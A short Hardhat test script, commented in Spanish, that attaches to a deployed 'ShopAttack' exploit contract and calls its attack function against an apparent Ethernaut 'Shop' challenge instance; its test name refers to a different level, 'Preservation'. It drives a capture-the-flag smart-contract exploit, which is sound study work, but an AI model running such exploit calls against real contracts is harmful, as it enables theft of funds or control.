import { assert } from "chai";
import { ethers } from "hardhat";

describe("Executing", function () {
  it("PreservationAttacker debe tomar ownership", async function () {

    // Attach to contracts
    const toa='0xe76512f3b0770C46eC2FE6ac4A6903C7814CdADF' //direccion contrato exploit
    const ethernautContract = await (await ethers.getContractFactory("ShopAttack")).attach(toa);

    const toa2='0xd83A31Ad660417c3E83992065567432CC3B66E09'; //direccion contrato instancia ethernaut
    
    //Llamamos al contrato exploit que implementa price del contrato shop de ethernaut
    await ethernautContract.attack(toa2); 
  });
});